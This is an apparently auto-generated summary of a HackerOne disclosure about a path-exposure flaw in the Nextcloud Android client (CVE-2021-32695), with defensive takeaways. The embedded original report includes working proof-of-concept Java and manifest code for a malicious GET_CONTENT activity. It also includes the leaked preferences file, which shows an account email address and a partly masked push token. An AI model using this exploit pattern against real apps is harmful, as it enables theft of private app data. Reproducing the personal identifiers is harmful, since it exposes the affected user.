# Arbitrary File Leak in Nextcloud Android Client Privacy Directory via Intent Manipulation

## Metadata
- **Source:** HackerOne
- **Report:** 1142918 | https://hackerone.com/reports/1142918
- **Submitted:** 2021-03-31
- **Reporter:** wester0x01
- **Program:** Nextcloud
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Path Traversal, Intent-based File Exposure, Insecure Intent Handler, Privilege Escalation via Intent
- **CVEs:** CVE-2021-32695
- **Category:** uncategorised

## Summary
The Nextcloud Android client's file upload feature accepts arbitrary URIs from third-party apps via the GET_CONTENT intent without proper validation. An attacker can register a malicious activity that returns a file:// URI pointing to sensitive application private files, causing the client to publicly share arbitrary files from its private directory when the user selects the malicious app during file upload.

## Attack scenario
1. Attacker creates a malicious Android app with an activity responding to GET_CONTENT intents
2. Malicious activity returns a file:// URI pointing to Nextcloud's private preferences file (/data/data/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml)
3. Attacker tricks user into installing the malicious app through social engineering or distribution channels
4. Victim opens Nextcloud client and navigates to a shareable directory, then attempts to upload content
5. User accidentally selects the malicious app from the intent chooser as the content source
6. Nextcloud client processes the returned URI and publicly shares the sensitive preferences file, leaking push tokens, account information, and storage paths

## Root cause
Nextcloud Android client does not validate the source or destination of URIs returned from GET_CONTENT intent handlers. It trusts the URI returned by any responding activity without verifying it points to user-selected content rather than application private files. The client should restrict file uploads to user-accessible locations and reject file:// URIs pointing outside the intended upload directory.

## Attacker mindset
An attacker would exploit the implicit trust in the Android intent system to conduct a supply-chain attack. By registering for a commonly-used intent action without proper filtering, the attacker can intercept file selection flows and inject malicious paths. The goal is to exfiltrate sensitive application data (credentials, tokens, configuration) by disguising it as a legitimate user action. This requires social engineering to trick users into selecting the malicious app.

## Defensive takeaways
- Validate all URIs returned from intent handlers before processing, especially file:// URIs
- Restrict file operations to sandboxed/user-accessible directories; reject paths pointing to app private directories
- Implement intent signature verification or use explicit intents when possible instead of implicit intents
- Use scoped storage APIs and avoid direct file:// URI handling; prefer content:// URIs with proper permissions
- Display clear warnings when accessing files from third-party apps, showing the source app name
- Implement URI canonicalization and path normalization to prevent traversal attacks
- Use FileProvider instead of exposing raw file:// URIs for inter-app communication
- Add runtime checks to ensure uploaded files are within expected directories

## Variant hunting
Similar vulnerabilities likely exist in other Android apps that handle file uploads/sharing via intents. Look for: (1) apps accepting GET_CONTENT/PICK intents without URI validation, (2) apps that process file:// URIs from external sources, (3) apps allowing file selection for upload/sharing without sandboxing, (4) apps using deprecated file handling APIs, (5) messaging/collaboration apps with file attachment features, (6) file manager/cloud storage apps with import functionality.

## MITRE ATT&CK
- T1204.001
- T1566.002
- T1190
- T1040
- T1555.003

## Notes
The leaked preferences file contains sensitive data including push notification tokens (FCM tokens) which could be used for further attacks, account email addresses, and storage configuration. The vulnerability is particularly dangerous because it requires minimal user interaction and leverages Android's implicit intent system. The attacker doesn't need device admin privileges or special permissions—just the ability to install an app and have the user select it during normal file upload operations. This demonstrates a critical gap in Android inter-process communication security where intent filters are too permissive.

## Full report
<details><summary>Expand</summary>

Steps to reproduce:

1.install and login nextcloud android client 
2.create a directory and set it 'shareable'
3.install the poc app "setresultcontactphotocrop"

key code:

`EvilActivity`
```
public class EvilActivity extends AppCompatActivity {
    final static String PRIVATE_URI = "file:///data/data/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("heen", "EvilActivity started!");
        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));
        finish();
    }
}
```
`manifest.xml->intent-filter`
```
  <activity android:name=".EvilActivity" >
            <intent-filter>
                <action android:name="android.intent.action.GET_CONTENT"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.OPENABLE"/>
                <data android:mimeType="*/*"/>
            </intent-filter>
        </activity>
```

4.Take into the shareable diretory in the step2, and click '+', choose "upload content from other apps"

5.if the victim click the poc app by accident, the secret file "/data/data/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml" will be publicly shared and leaked.


com.nextcloud.client_preferences.xml content
```
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="keysMigration" value="true" />
    <string name="select_oc_account">yunbeitai2015@126.com@efss.qloud.my</string>
    <boolean name="autoUploadPathUpdate" value="true" />
    <boolean name="autoUploadInit" value="true" />
    <float name="grid_columns" value="3.0" />
    <string name="storage_path">/storage/emulated/0/Android/media/com.nextcloud.client</string>
    <boolean name="legacyClean" value="true" />
    <boolean name="storagePathFix" value="true" />
    <boolean name="autoUploadEntriesSplitOut" value="true" />
    <int name="lastSeenVersionCode" value="30150190" />
    <boolean name="keysReinit" value="true" />
    <string name="pushToken">dsqXrhNrS0aKvlblvQirA5:APA91bFsXrXQAy****StWaRswHJJG39zx5rAMX_yrjsSQD23fJnFNkro9hxwSZmwbufEn_M0IEPhGwGgMJ29WCfNmGlem6teT6qXHZQW3GY57tk9CbVmjb5kiSjHBqF6OUTI6b0WAzQI</string>
</map>
```

## Impact

arbitrary sensitive file under nextcloud android client privacy directory /data/data/com.nextcloud.client leaked
{F1249064}

</details>

---
*Analysed by Claude on 2026-05-24*
